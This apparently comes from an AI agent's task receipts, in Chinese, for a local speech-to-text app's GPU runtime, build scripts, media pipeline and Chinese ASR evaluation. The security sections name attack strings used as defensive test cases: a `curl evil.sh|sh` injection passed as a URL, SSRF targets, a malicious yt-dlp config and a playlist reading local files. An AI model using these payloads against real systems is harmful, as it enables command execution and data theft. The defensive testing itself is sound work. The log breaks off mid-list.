# gpu-runtime 回执

## [2026-08-02 05:05] T-002 DONE

交付: `/root/memo/docs/research/R-02-runtime-gpu.md`（id: R-02, author: gpu-runtime, status: ready, TL;DR 10 行）

要点:
- **架构基石（已验证）**：ggml 的 `GGML_BACKEND_DL=ON` 让后端编成独立 `.dll/.so`，运行时扫描可执行文件所在目录 → 调 `ggml_backend_score()` 打分 → 不支持则**静默跳过**（我读了 `ggml-backend-reg.cpp` 源码确认 `silent=true`）。我用 HTTP Range 拆开官方 zip 实测：CPU 包与 CUDA 包**结构完全一致**，差集仅 `ggml-cuda.dll` + 6 个 CUDA 运行时 DLL。→ **要求 2.1 = 往同一目录多丢几个文件**，是一等公民能力。
- **ASR 推荐 whisper.cpp（MIT）为主引擎，但二进制必须我们自建 CI**：官方 v1.9.1 只有 Win cpu/blas/cublas + Linux cpu + iOS xcframework，**无 macOS CLI、无 Vulkan、无 ROCm**（我下载并解析了 `release.yml` 确认 job 列表）；而源码 `GGML_VULKAN/GGML_HIP/WHISPER_COREML` 全支持。副引擎 sherpa-onnx（Apache-2.0，npm 有完整 per-platform 预编译包）用于流式/VAD/Parakeet。**淘汰 faster-whisper**：Apple Silicon 明确不支持 MPS + cuDNN 要用户手动 pip 装。
- **CUDA 体积实测**：`whisper-cublas-12.4.0-bin-x64.zip` **677.9 MB**（`cublasLt64_12.dll` 328 MB + `ggml-cuda.dll` 251 MB 多架构 fat binary）。对比 llama.cpp Vulkan 包仅 **32.51 MB**。→ 建议自建单架构 CUDA 包 + 把 Vulkan 作为通用/小包选项。**好消息：ggml 不需要 cuDNN，用户也不需要装 CUDA Toolkit，只需显卡驱动。**
- **签名结论（要求 2.1 能否落地的关键）**：Apple Silicon 上**所有可执行文件必须至少 ad-hoc 签名**（Apple 官方原文）；`stapler` **不能** staple 裸 Mach-O（Apple DTS 工程师原话），只支持 .app/.dmg/.pkg。→ 必须用**我们自己的 Developer ID 重签所有下载的二进制**（否则 hardened runtime 的 library validation 拒绝加载），notarize zip，靠"程序化下载不打 quarantine" + `xattr -dr` 兜底，退路是用户域 `.pkg`。Windows 侧：**EV 证书已不再给即时 SmartScreen 信誉**（微软 2024 根程序变更），签 OV 即可，不必多付 2.7 倍买 EV。
- **LLM 三档**：① BYO API Key 为默认 ② 端口探测复用已装 Ollama(`:11434`)/LM Studio(`:1234`) ③ 内置 llama.cpp `llama-server` —— 它的官方预编译矩阵**极完整**（Win/Linux/macOS × cpu/cuda/vulkan/hip/sycl/openvino），**这条线不需要自建 CI**。

下一步建议:
- 排 3 个 spike（文档 §F.4）：① 自建 whisper.cpp CI 矩阵 + 实测各后端 RTF（决定 NVIDIA 用户默认推 CUDA 还是 Vulkan）② macOS Gatekeeper 实测（30 分钟，决定整个 mac 分发形态）③ 单架构 CUDA 包瘦身实测。
- 请把「后端包下载器」与「模型下载器」合并为一个组件（manifest + sha256 + Range 断点续传 + 签名校验 + 镜像切换），与 R-04(model-mgmt) 共用，格式已在 §C.3 给出草案。
- 架构组按「本地 daemon（64 位）+ 独立子进程 probe（10s 超时 + 崩溃隔离）+ 后端包管理器」设计；网页只跟 daemon 通信。

需要 Manager 决策:
1. **是否批准自建 whisper.cpp CI 矩阵**（约 1 人周）。不自建则 macOS 用户没有任何可下载的 CLI 二进制，要求 2.1 在 mac 上直接不成立。这是本文最核心的请求。
2. **签名预算与主体资格**：Apple Developer Program **$99/年**（必需，无替代）；Windows 侧 Azure Trusted Signing 需**美/加、成立满 3 年的组织**（具体美元价 UNKNOWN，页面动态渲染），否则走 SSL.com OV **$129/年 + 硬件令牌 $379**。需要确认签名主体是谁。
3. **NVIDIA 用户默认后端**：CUDA（678 MB，性能未知）vs Vulkan（~30 MB，性能未知）。**建议 spike 实测后再定**，但需 Manager 认可"先按 Vulkan 为默认、CUDA 作为可选高性能包"的临时立场。
4. **是否把「离线全量安装包」（~750 MB+）列为 v1 交付物**（企业/内网用户刚需，参考 OllamaSetup.exe 1.56 GB）。
5. R-03 §1 三分法在本域的落地：whisper.cpp/llama.cpp **源码用 submodule（因为要自建）**，但**产物走运行时下载**——请在 ADR 中明确这是同一组件的两种引入方式并存，不冲突。

派生 subagent 记录（未 kill，可复用）:
- `add333caaa475ff26` — llama.cpp release / ONNX Runtime EP / CTranslate2 打包核实（sonnet5，已完成）
- `a0f81b7af877f2a4a` — whisper.cpp / sherpa-onnx release 资产核实（sonnet5，已完成）
- `a8dfcc9a74608961b` — transformers.js WebGPU / Moonshine / Parakeet / Vosk / Open ASR Leaderboard 核实（sonnet5，已完成）
- `ab0fbd80ac5da7ab5` — Windows 代码签名 / Apple 公证 / Ollama & LM Studio 先例核实（sonnet5，已完成）

诚实声明:
- 本机为 **Linux x86_64 无 GPU 虚拟机**。Linux 侧检测手段**已实跑验证**（含一个关键反例：`libvulkan.so.1` 与 `libOpenCL.so.1` 都在，但无 GPU、无 `/dev/dri` → **文件存在性检测不可信，必须真的枚举设备**）。**macOS / Windows 侧一律未验证**，全部来自官方文档核实。
- 我用 HTTP Range 实际下载并解析了 whisper.cpp 官方 zip 的 central directory，逐文件体积是**实测字节数**，非估算。
- **未做任何编译、未跑任何 GPU 推理**。所有 RTF/性能数字：whisper.cpp 官方 bench 帖**只有 CPU/WASM 数据，无任何 GPU 数据**（已核实），transformers.js 官方文档**无任何速度数字**（已核实）。**Vulkan vs CUDA 的性能比例 = UNKNOWN，文档中未编造任何 benchmark。**
- 16 项 UNKNOWN/未验证已在文档 §F.3 逐条列全，其中最关键 3 项：各 GPU 后端实际 RTF、macOS 15/26 上 quarantine 行为、llama.cpp 与 whisper.cpp 的 ggml ABI 能否共用后端包（whisper.cpp soname 已验证为 `0.15.1`）。

---

## [2026-08-02 13:35] T-012 DONE

交付:
- `docs/design/D-04-build-and-runtime.md`（id: D-04, status: ready, TL;DR 20 行）
- `scripts/build-whisper.sh`（平台×后端参数化，**已实跑产出 cpu + vulkan 两个包**）
- `scripts/build-probe.sh`（**已实跑**，带 smoke test）
- `packages/runtime/src/native/probe.c`（**已编译并运行**）
- `packages/runtime/src/{types.ts,index.ts,selfTest.ts,probe/runProbe.ts,detect/system.ts,detect/gpu.ts,backends/manager.ts}`
- `.github/workflows/build-backends.yml`（**未验证：无 git remote，从未执行**）
- 产物：`dist/packs/whispercpp-{cpu,vulkan}-linux-x64.{tar.gz,json}`

要点（**重中之重已完成，全部实测**）:
- **`GGML_BACKEND_DL` 论断已实证，不再是读源码的推断**：`ldd libwhisper.so` 只有 `libggml.so.0` + `libggml-base.so.0`，**12 个 CPU 后端一个都不链接**，全是运行时 dlopen。运行时自动从 12 个变体里选中 `zen4`（本机 Zen5 + AVX512_BF16，选得对）。
- **第一批真实 RTF**（11.0s 音频 / 8 线程 / 各跑 3 次）：`tiny.en` wall **0.295–0.323s → RTF 0.027–0.029（~35x）**；`base.en` **0.439–0.450s → RTF 0.040（~25x）**；**强制最差 sse42 兜底 1.029–1.136s → RTF 0.094–0.103（~10x）**。→ **最优/最差 CPU 变体差 3.4 倍**，这是 `GGML_CPU_ALL_VARIANTS` 必开的量化理由，也说明**我们不必自己检测 AVX 等级**。
- **Vulkan 编译成功**（无 GPU 的机器也能编 → CI runner 不需要 GPU）。**L2 加速包 = 恰好 1 个文件**，22.7 MB tar.gz，对照 R-02 从 llama.cpp 外推的 "~15–35 MB"，**外推成立**。
- **要求 2.1 闭环实测跑通**：L1 core（7.70 MB tar.gz）→ 丢进 1 个 `libggml-vulkan.so` → 重新 probe → Vulkan 后端加载成功。**无重装、无重启、无改配置。** 包完全可重定位（`env -u LD_LIBRARY_PATH` 下正常）。
- **两个新发现（R-02 没预料到）**：① 装 `vulkan-tools` 后 Mesa lavapipe 让**无 GPU 的机器报告 1 个 Vulkan 设备**（deviceType=CPU）→ **"枚举到设备>0" 同样不可信**，必须看 deviceType（ggml-vulkan 上游已正确过滤，我们再加一层）。② **删光 CPU 后端时 whisper.cpp 是 `ggml_abort()` + SIGABRT(exit 134)，不是返回错误** → 「probe 跑子进程」从"保守设计"变成**实证刚需**；**L1 CPU 包是承重墙，永不可卸载**。
- **装了用不上的 Vulkan 包 = 零损耗**（0.277–0.354s，与纯 CPU 同档，无报错，静默回落）→ **降低了 ADR-003 决策 3 的风险**：给 NVIDIA 默认推 Vulkan 即使推错也不会让产品变坏。
- **自己的测试抓到自己一个真 bug**：`selfTest` 初版报 `backendUsed:"Vulkan"` 而计算实际全在 CPU —— 我 grep 了第一条 `load_backend`，但 ggml **先加载全部后端再选**。已修（改用 `whisper_backend_init_gpu` 判定）并复测为 `"CPU"`。**"loaded" ≠ "used"**。若不真跑一遍，这个错数字会一路骗到 UI 上。
- **ggml ABI 实测**：whisper.cpp v1.9.1 = **0.15.1**（master 已 0.18.0）→ 跨引擎复用后端包必须按此 gate。

已处理 Manager 三条插播:
1. **类型错误：在收到消息前已自行修复并验证**。根因确认与 `oss-scout` 一致（条件类型不分配到类型别名 → `never`）；我的修法是直接用 `ProbeFailureKind`（等价于他建议的 `Extract<...>`）。TS2367 是把 `signal` 当 `code` 比，已按 `string|number|null` 正确标注。
2. **ADR-005/006 已读并落地**：CI 的 manifest job 加 `actions/setup-node@v6 node-version: '22'`；`manager.ts`/`index.ts` 的降级链注释已改为 **L1 → L2**（L0 移出 v1）；我只写了 `scripts/build-*`，**未碰 `scripts/license-report.mjs`**。
3. **已改用 `vendor/whisper.cpp`**（v1.9.1，`f049fff9`）跑正式构建，`/tmp` 那份只用于最早的探索。

⚠️ 观察（非 DISPUTE，只是提示）: `pnpm -r build` 目前 EXIT=1，卡在 **`packages/downloader/src/queue.ts(17,62): TS2305 Module '@openmemo/shared' has no exported member 'ulid'`** —— `model-mgmt` 新增了 `packages/shared/src/ulid.ts` 但尚未从 `index.ts` 导出，属其正在编辑中的中间态。**与我的文件无关**：`packages/runtime` 自身零错误、eslint exit=0、dist 已产出、两个 .sh `bash -n` 通过、workflow YAML 解析通过。

下一步建议:
- **[最高价值] 借一台有 NVIDIA 卡的机器跑 1 小时**：测 CUDA vs Vulkan 的 whisper RTF。这是唯一能证实/推翻 ADR-003 决策 3 的实验，目前该性能比**仍是 UNKNOWN**（本机无 GPU，本次既未证实也未推翻）。
- **单架构 CUDA 瘦身实测**（`-DCMAKE_CUDA_ARCHITECTURES=86`）：决定 CUDA 包是 678 MB 还是 <100 MB。
- **给仓库配 git remote**，让 CI 真跑一次拿到 mac/Win 产物；第一次一定会失败（预期：CUDA job 撞 14 GB 磁盘上限、SDK 路径漂移、MSVC generator 差异）。

需要 Manager 决策:
1. **是否安排有 GPU 的机器做 spike**（上面第一条）。不做的话 ADR-003 决策 3 会一直停在"临时立场"。
2. **CI 无 remote 期间，mac/Win 产物如何获得** —— 目前 macOS 侧完全没有可分发二进制，要求 2.1 在 mac 上仍不成立（这正是 ADR-003 决策 2 批准自建 CI 的原因，但没有 remote 就落不了地）。
3. 自检音频目前用 whisper.cpp 仓库的 `samples/jfk.wav`（11.000s）。**需确认是否可随产品分发**，否则我按 R-02 的建议换成自备素材（`selfTest.ts` 已把音频路径与时长参数化，换素材零成本）。

派生 subagent 记录（未 kill，可复用）:
- `acbd63ceb8a521e6c` — GitHub Actions runner label / CUDA·Vulkan·ROCm setup action / llama.cpp+whisper.cpp release CI 核实（sonnet5，已完成）
- T-002 的 4 个仍可复用（见上一条回执）

诚实声明:
- 本次**真编译、真运行、真计时**。D-04 §10.1 列了 14 项实测验证（附命令与输出）。
- D-04 §10.2 列了 10 项未验证/UNKNOWN，最关键 3 项：**CUDA vs Vulkan 性能比仍 UNKNOWN**、**mac/Windows 全部分支未验证（无机器）**、**CI workflow 从未执行（无 remote）**。
- CUDA 与 ROCm 包**未编译**（无 SDK 与硬件），不是"应该能编"，是**没编**。

---

## [2026-08-02 14:40] T-020 DONE

交付:
- `packages/pipeline/src/**` —— 18 个源文件 + 4 个测试文件（`subprocess/{argGuard,runner}.ts`、`tools.ts`、`media/{types,registry}.ts` + `media/sources/{localFile,directHttp,rss,ytdlp}.ts`、`audio/{ffmpeg,vad}.ts`、`asr/{types,whisperCpp}.ts`、`queue/lanes.ts`、`transcribe.ts`、`index.ts`）
- `docs/design/D-06-pipeline.md`（id: D-06, status: ready, TL;DR 12 行）

要点（**验收标准逐条实跑，全部贴了真实输出**）:
- **F2 本地文件端到端** `[实测]`：11.0s 音频 → **0.80s**，RTF **0.047**（**21.3x**），转写逐字正确：`And so, my fellow Americans, ask not what your country can do for you, ask what you can do for your country.`
- **F1 真实公网 URL 端到端** `[实测]`：`upload.wikimedia.org` 的 1921 Marcus Garvey 演讲（**公有领域**，Commons API 确认 `Copyrighted=False`），2,658,394 字节 → 220.2s 音频 / **9 chunk / 45 段 / 20.2s**，ASR RTF **0.045**（**22.2x**）。**关键：这条是在 `enableSiteExtractor: false`（yt-dlp 完全关闭）下跑通的** → TD-002 不是声称，是跑出来的。
- **测试 75/75 全绿**，eslint 干净，`tsc -b` 干净。用 Node 内置 `node:test`，**未新增任何依赖**（没碰 oss-scout 的 root package.json）。
- **命令注入 7 层全部落地，25 个攻击用例逐层对应**：`--exec=curl evil.sh|sh` 当 URL、换行走私（`new URL()` 会静默吞 `\n`，所以控制字符必须在 parse **之前**查）、多字节长度绕过（1000 个 emoji < 2048 字符但 = 4000 字节）、SSRF 打 `169.254.169.254` **和我们自己的 127.0.0.1 daemon 端口**、symlink 逃逸（`path.resolve` 会被骗，必须 `realpath`）、Windows `.bat`（CVE-2024-27980）。
- **真跑抓到我自己 3 个 bug，全修 + 加回归测试**（D-06 §6.3 详述）：
  1. `isSafeExecutable` 用**宿主**的 `path.isAbsolute` 判 Windows 路径 → 在 Linux 上 `C:\...` 一律被判穿越，**CVE 那条分支根本不可达，`.bat` 测试一直在为错误的理由通过**。是"断言错误码而不只断言拒绝"这个习惯揪出来的。
  2. **whisper 的 `offsets` 是绝对时间不是相对时间**（实测 `--offset-t 60000` → 报 `from: 60000`），我又加了一次偏移 → **220s 录音出现 419.9s 的段落**。**单 chunk 测试永远看不见**，只有多 chunk 真跑能暴露 —— 这正是"必须跑真实音频"这条验收标准的价值。
  3. **chunk 边界重复转写**（whisper 按 30s 窗口解码会越过 `--duration`）→ 时间戳非单调、F5 播放高亮会闪。加 `dedupeBoundarySegments`（要求**时间重叠 >50%**，不能只看文本相似——说话人真的会重复自己）。修复后段数 51→45，`monotonic: true`。
- **两个意外的省事发现**：① VAD **不需要新依赖** —— whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero，MIT），**已在我 T-012 建的 L1 core 包里**；注意输出单位是**厘秒**不是秒（读错会让 chunk 长 100 倍，已加断言守住）。② whisper v1.9.1 的 `--output-json-full` **不输出 `avg_logprob`/`no_speech_prob`**（实测 segment 只有 `['timestamps','offsets','text','tokens']`）→ 置信度改用**真实 token 概率均值**（排除 `[_BEG_]` 否则虚高），实测 0.65–0.93，与文本质量吻合。
- **TD-002 的真正修正**：D-01 §6.4 的规则是**按 probe 结果回退**而非按 URL 打分。我第一版只做了打分，导致 watch 页 URL 被 DirectHttp（30 分）截胡后直接失败、永远到不了兜底 —— 是测试逼出了这个修正。现在 `registry.probe()` 依次真的尝试每个候选。
- **GPU lane 互斥已测**：4 个混合任务下**同时占用违例 = 0**；异常路径与排队中 abort 两条路径都不泄漏 permit（泄漏会死锁掉之后所有 GPU 任务）。

下一步建议:
- **F3 流式是唯一没动的功能**：`SherpaOnnxEngine` 未实现，只留了 `AsrEngine.openStream?` 可选接口；F3 两阶段（流式→离线重跑提准）也未实现。建议单开一个任务，接 `sherpa-onnx-node`（npm 有完整 per-platform 预编译，T-002 已核实）。
- **真跑一次 yt-dlp 路径**：本机未装（ADR-001 C 类运行时下载），§2 L4 那组硬化参数（尤其 `--ignore-config`）**一行都没真跑过**。
- 换 `large-v3-turbo` 复测质量：base.en 在 1921 年蜡筒录音上把 "Negroes" 误识成 "nicles"，量一下模型档位的实际影响（ADR-004 决策 3：跑真实基准不编数字）。

需要 Manager 决策:
1. **`SubprocessRunner` 的位置**：D-01 §8.4 写的是 `apps/daemon/src/subprocess/**`，我实现在 `packages/pipeline/src/subprocess/`（spawn 实际发生地，daemon 直接 import 即可）。请确认这个调整，并据此定 CI 的 `no-restricted-imports` 路径白名单（我没改 eslint 配置，不是我的文件）。
2. **F3 流式排期**：是否单开任务给我或他人。
3. **两个已知 TOCTOU 缺口是否进 v1**（D-06 §9.2 第 7/8 条）：DNS rebinding（需自定义 `lookup` 钉住 IP）、路径校验后未立即转 fd 操作。目前**已记录未修**。

派生 subagent 记录（未 kill，可复用）:
- `abab65376c60e9bee` — 公有领域测试音频 + Silero VAD + yt-dlp 参数核实（sonnet5，已完成）
- T-002/T-012 的 5 个仍可复用（见前两条回执）

诚实声明:
- D-06 §9.1 列了 10 项已实测（附命令与输出），§9.2 列了 **12 项未验证/未实现**。
- **未实现**：F3 流式引擎、F3 两阶段。**未真跑**：yt-dlp 路径、真实 RSS feed、真实 HLS 流、Windows/macOS 分支、长音频（最长只测到 220s）、中途取消、`nice`、中文多语种（只测了英文）。
- 两个 TOCTOU 缺口是**已知未修**，不是"应该没问题"。

---

## [2026-08-02 15:35] T-025 DONE

交付:
- `packages/pipeline/src/asr/sherpaOnnx.ts`（F3 流式引擎）、`asr/merge.ts`（两阶段合并）
- 新测试：`asr/__tests__/{merge,sherpaStream}.test.ts`、`media/__tests__/registryFallback.test.ts`
- 修改：`media/registry.ts`（新增 `probeWithSource`）、`transcribe.ts`（改用回退链）、`index.ts`
- **`docs/SECURITY.md`（新建）**
- `docs/design/D-06-pipeline.md` 追加 §11–§14

**测试 75 → 101 全绿**，eslint 干净，`tsc -b` 干净。

## A. F3 流式（已实测）
- `SherpaOnnxEngine` + `streaming-zipformer-zh-14M`（74 MB）：**RTF 0.010–0.066（15–105x 实时）**，逐字时间戳，11–12 次 partial 更新演进出完整句子。
- **两阶段真跑通**：流式草稿「…全球金融**动能**的表现」→ 用户改成「**动荡**」→ large-v3-turbo 离线重跑「…金融**动荡**的表现。」→ 合并结果 **`已更新 0 段转写 · 你编辑过的 1 段已保留`**，`flags=4`(HUMAN_CONFIRMED)，**USER EDIT PRESERVED: YES ✅**。
- 合并**按时间匹配而非按索引**：两遍模型切分天然不同，按索引会把别人的句子塞给用户。最强保证：**编辑过的段即使重跑处无对应也永不删除**。
- ⚠️ **第一次真跑就抓到 bug**：`close()` 先置 `closed=true` 再排空队列 → 已排队的写入全部 bail，**整段录音零输出**。拆成 `closing`/`closed` 两个标志已修 + 回归测试。

## B. 中文补测（Manager 要求，结论明确）
素材 `Zh-Twitter.ogg`（CC BY 3.0，337s 中文维基朗读）。

| | base | large-v3-turbo-q5_0 |
|---|---|---|
| ASR RTF | 0.055（18.2x） | **0.377（2.7x）** |
| 置信度均值 | 0.81 | **0.95** |
| 繁体泄漏 | 有 | **0/22 段** |

**base 中文不可用**（不是稍差，是专有名词几乎全错）：维基百科→**危机摆科**、百科全书→**摆科权书**、华尔街日报→**花耳街日报**、印度孟买→**印度梦买**、迈克尔杰克逊逝世→**麦克尔结克训试事**、谷歌/李开复→**古歌/李开夫**、乔治·W.布什→**乔志W不时**、752%→**752的**。large-v3-turbo 上述全部正确。

**三条建议**：① **不要给中文用户提供 base/small 选项**，会让人以为产品很差；② 繁简问题有廉价解法**且已验证**——初始 prompt「以下是普通话的句子，请使用简体中文转写。」能把 `對我做了介紹` 纠正为 `对我做了介绍`（已写进流水线中文默认参数，但**只解决字形不解决准确率**）；③ F3 实时用 sherpa zh-14M，离线用 large-v3-turbo。FunASR/Paraformer **未测**（sherpa-onnx 已支持，建议下轮评估）。

**⚠️ 这条改变了 GPU spike 的性质**：中文必须用 large-v3-turbo，而它在 CPU 上只有 2.7x 实时（1 小时录音跑 22 分钟）。中文是主要用户群 → **ADR-003 决策 3 的 CUDA/Vulkan 实测从"性能优化"升级为"中文可用性前提"**。

## C. 未验证项补跑（全部实测）
- **真实 RSS**：LibriVox（128 集）+ NASA Megaphone（102 集），标题与 enclosure 全部正确解析。
- **长音频 33.6 分钟**：80 chunk / 430 段 / RTF 0.089（11.2x）/ **峰值内存仅 89 MB**（不随时长增长）/ chunk 连续无缺口 / 时间戳单调。
- **中途取消**：**0 孤儿进程、0 permit 泄漏、无死锁、部分结果保留 [0,1,2]、临时文件已清**。
- **yt-dlp**：真实 YouTube 视频 probe 成功（Big Buck Bunny，635s，7 tracks）。**并且植入恶意 `~/.config/yt-dlp/config`（`--exec "touch PWNED"`）实测 `--ignore-config` 挡住了** —— 从"我们配了参数"变成"真实攻击验证通过"。
- **仍未验证**：HLS 真实流、Windows/macOS、F3 接浏览器麦克风、ffmpeg 协议白名单的恶意播放列表实测。

## D. `docs/SECURITY.md`
威胁模型 + 7 层防护 + **两个 TOCTOU 缺口逐条记录**（位置/触发前提/为何当前可接受/**必须立即修复的触发条件**）。DNS rebinding 那条列了 5 个触发条件（多用户、非 127.0.0.1、云部署、下载内容回显、本机出现其它 localhost 服务）。附表如实标注三项未验证 + 一项**未实现**（解压 Zip-Slip 防护在 `packages/downloader`，属 `model-mgmt`）。

## 第三个 bug（补跑时抓到，影响 TD-002）
长音频跑挂在 `fetch failed`，查下去发现真正问题是 **`TranscribePipeline` 调 `resolve()`+`probe()`，绕过了我 T-020 加的 probe 回退链**。后果：① **GPL 兜底在真实导入路径里永远不触发**——TD-002 的解析顺序在最关键那条路径上是摆设；② 第一个候选的瞬时网络错误直接失败整个任务。已加 `registry.probeWithSource()` 修复 + 回归测试。

需要 Manager 决策:
1. **`sherpa-onnx-node@1.13.4`（Apache-2.0）需要加进 `packages/pipeline/package.json`** —— 该文件不在我的所有权范围，我用动态 `import()` 懒加载使其缺失时可降级，但正式依赖需指派人添加。
2. **中文默认模型策略**：是否采纳"不向中文用户提供 base/small"的建议（§12.3）。
3. **GPU spike 优先级是否上调**（见 B 末尾：中文可用性依赖它）。
4. **F3 剩余接线归属**：麦克风 → WS → `AsrStream` → 停止后自动排离线重跑 job。合并函数已就绪，但队列层与前端接线跨 `apps/daemon`(oss-scout) 与 `apps/web`(前端组)。
5. **解压 Zip-Slip 防护未实现**（`packages/downloader`），需确认归属与排期。

与 `oss-scout` 的契约（无 DISPUTE）:
`mergeTranscripts()` 只依赖 `transcript_segments.edited_at`（`null`=未编辑，判定唯一依据）与 `text_raw`（编辑前原文，供 diff/还原）。撤销由 D-02 §1.5 的 `is_active=0` 多版本机制承担，合并函数不实现。`packages/db` 目前只有 driver/migrate 骨架、尚无 schema，落 schema 时请保留这两列。

诚实声明:
- D-06 §14.1 列 11 项本轮实测，§14.2 列 **10 项仍未验证/未实现**。
- **未实现**：F3 接浏览器麦克风、F3 两阶段在 daemon 的调度、说话人分离、解压防护。
- **未验证**：HLS 真实流、Windows/macOS、ffmpeg 协议白名单实测、FunASR 对比。
- 测试脚手架自身出过一次**假红灯**（`pgrep` 数到了并行任务，误报孤儿进程泄漏），已改为按父进程归属。与 ADR-008 记的"假绿灯"是同一类问题的镜像。

---

## [2026-08-02 16:30] T-026 DONE

交付:
- `docs/design/D-06-pipeline.md` §15（**🔒 冻结契约**）、§16（ffmpeg 安全实测）、§17（HLS）、§18（**Paraformer 评估**）、§19（诚实清单）
- `docs/SECURITY.md` §2.2 重写：真实攻击验证 + **新查出并修复的漏洞**
- `packages/pipeline/src/subprocess/argGuard.ts`（新增 `PLAYLIST_EXTENSIONS` / `isPlaylistExtension` / `isLocalImportSafeExtension`）
- `packages/pipeline/src/media/sources/localFile.ts`（拒绝本地播放列表导入 + ffprobe 双保险）
- `packages/pipeline/src/index.ts`、`argGuard.test.ts`（新增 3 个攻击用例）
- `packages/pipeline/package.json` 加 `sherpa-onnx-node@^1.13.4`（**依 ADR-011 决策 1 授权，特此申报**）

**测试 101 → 104 全绿**，eslint / tsc / prettier 干净。

## 1. 契约已冻结（D-06 §15）
`AsrStream` 接口 + 8 条调用语义（`write` 同步排队、`close` **先排空再封死**、幂等、partial 单调增长、时间戳为绝对毫秒、中文 `words[]` 逐字…）；合并契约 `edited_at`（判定唯一依据）/ `text_raw` + 五行规则表。已标 **FROZEN**，我不再单方变更。

## 2. ffmpeg 恶意播放列表实测（照打 yt-dlp 的方式打了一次）
构造引用 `file:///tmp/attack/secret.ts` 的恶意 HLS，三种变体（`file:` / `concat:` / `subfile:`）：
- **对照组（允许 file）**：`Opening 'file:///tmp/attack/secret.ts' for reading` → **攻击成立，真读了本地文件**
- **我们的白名单**：`Protocol 'file' not on whitelist '…'!` → **全部挡住**

⚠️ **方法论教训**：第一次用 `.txt` 金丝雀，攻击"失败"了——但挡住它的是 **ffmpeg 8.x 自己的 `allowed_segment_extensions`，不是我们的白名单**。换成 `.ts` 才隔离出真正起作用的那层。**与"假绿灯"同源：必须确认"挡住了"是被哪一层挡住的。**

## 3. ⚠️ 由此查出我自己代码的一个真实漏洞（已修）
远程路径安全，**本地路径不安全**：`LocalFileSource` 的扩展名白名单**包含 `.m3u8`**，而本地分支必须传 `-protocol_whitelist file`（否则普通媒体解不了）。实测本地恶意 `.m3u8` **成功越过受管根目录读文件** —— 协议白名单在这里救不了，因为播放列表是通过一个我们**故意启用**的协议读文件，直接绕过 `assertWithinRoot`。
**已修**：本地导入拒绝所有播放列表扩展名 + ffprobe `format_name` 命中 `hls|applehttp|m3u` 双保险（防改名）+ `match()` 返回 0。远程 HLS 不受影响。复验：`match=0`，probe 抛明确错误。

## 4. HLS 真实流 ✅
`shaka-demo-assets/angel-one-hls`（公开 GCS，VOD 60s）：11 轨识别、拉流、归一化成 16kHz 单声道全部通过。备用流 `test-streams.mux.dev` 也已验证。

## 5. ★ Paraformer 中文评估 —— 结论：**成立，而且差距比预期大**
同一段 `Zh-Twitter.ogg`（337s）、同一套 VAD 切分、同一台无 GPU 机器：

| | whisper base | **paraformer-zh-small + 标点** | large-v3-turbo-q5_0 |
|---|---|---|---|
| 体积 | 148 MB | **78+279 = 357 MB** | 547 MB |
| **合计 RTF** | 0.055（18x） | **0.0119（84x）** | 0.377（2.7x） |
| **1 小时录音** | 3.3 分钟 | **43 秒** | **22 分钟** |
| 专有名词命中 | ~2/13 | **12/13** | 13/13 |
| 标点 / 简体 | ✅ / 需 prompt 仍泄漏 | ✅（后处理 3–21ms）/ ✅原生 | ✅ / ✅ |
| 阿拉伯数字 | ✅ | ❌ 中文数字 | ✅ |
| 词级时间戳 | ✅ | ❌ **无** | ✅ |

**Paraformer 比 turbo 快约 32 倍，专有名词 12/13**（维基百科/百科全书/华尔街日报/孟买/迈克尔杰克逊/谷歌/李开复/布什/柯林斯… 全对）。

**⚠️ 这推翻了我上一轮结论的一半**：T-025 我说"中文必须 turbo → GPU 是中文可用性前提"。**现在不成立了** —— Paraformer 让无显卡中文用户拿到 84x 实时。**GPU 仍值得做**（turbo 质量更高、英文/多语种仍靠 whisper），但**不再是中文可用性的前提**。请据此重新评估 NVIDIA 机器的优先级。

**三个诚实缺点**：中文数字（"两千零八年"）、**无词级时间戳**（F5 中文需降级为段级高亮）、英文全小写。前两者影响产品，均**未实现**后处理。

需要 Manager 决策:
1. **是否把"中文离线默认引擎"改为 Paraformer**（无 GPU 时）。这是本轮最大的产品含义。
2. **F5 中文词级高亮如何处理** —— Paraformer 拿不到词级时间戳，只有段级。是接受段级降级，还是中文强制走 whisper？
3. **中文数字→阿拉伯数字后处理归属**（会影响 LLM 抽取年份）。
4. **NVIDIA 机器优先级是否下调**（依据见第 5 点）。

诚实声明:
- D-06 §19.1 列 6 项本轮实测，§19.2 列 **10 项仍未验证/未实现**。
- **Windows / macOS 继续未验证**（无机器，未假装）。**说话人分离按 ADR-011 决策 6 未做。**
- `paraformer-zh` 完整版（234 MB）与 SenseVoice（1.05 GB）**未测**（下载超时/体积）；FunASR 原生 Python 栈**未测**（刻意不引入 Python 依赖，只走 sherpa-onnx 的 ONNX 路径）。
- Paraformer 的 RTF 在两次运行中为 0.0027 与 0.0111（线程竞争差异），报告取**较保守的 0.0119（含标点）**。

---

## [2026-08-02 17:20] T-030 DONE（按新优先级：功能优先，性能靠后）

交付:
- `packages/pipeline/src/asr/paraformer.ts`（中文默认引擎）、`selectEngine.ts`（引擎选择）、`sherpaModule.ts`（**interop 修复**）、`postprocess.ts`
- `packages/pipeline/src/benchmark/{clips.ts,runBenchmark.ts}`（已写完，按裁决**不再投入**）
- 修改：`whisperCpp.ts`（语言默认）、`sherpaOnnx.ts`（interop）、`media/sources/ytdlp.ts`（**2 个功能 bug**）、`index.ts`
- **104/104 测试全绿**，eslint / tsc 干净

## ★ 最重要：我领域内的功能缺失清单

### A. 矩阵标错的
| 行 | 矩阵 | 实际 | 说明 |
|---|---|---|---|
| F1 yt-dlp 全链路 | ⚪ | **曾经是 🔴，现在 🟢** | 你标 ⚪ 是对的，而且比 ⚪ 更糟：**这条路径是坏的**，见下面 2 个 bug |
| F1 播客 RSS | 🟢 | **应为 🟡** | 我只**解析过 feed**，**从没从 feed 里真的下载并转写一集**。和 yt-dlp「只测 probe」是同一个错误形状 |
| F1 HLS | 🟢 | **应为 🟡** | 探测+拉流+归一化验证过，**没在 HLS 音频上真跑过 ASR** |
| F3 流式 ASR | 🟢 | **🟢 但曾靠运气** | 见下面 interop bug |

### B. ⚠️ 矩阵**漏掉**的功能点（比标错更重要）

1. **【最严重】ASR 模型全都不在模型目录里。** `vendor/manifests/` 只有 whisper(9) + LLM(5) + backends(10)。**以下 4 个我的流水线必需的模型一个都没有**：
   - `ggml-silero-v5.1.2.bin` — **VAD，D-01 §4.1 分块设计的地基**。没有它 → 退化成固定窗口切分
   - `sherpa-onnx-streaming-zipformer-zh-14M`（74 MB）— **F3 流式唯一引擎**
   - `sherpa-onnx-paraformer-zh-small`（78 MB）— **ADR-013 定的中文默认引擎**
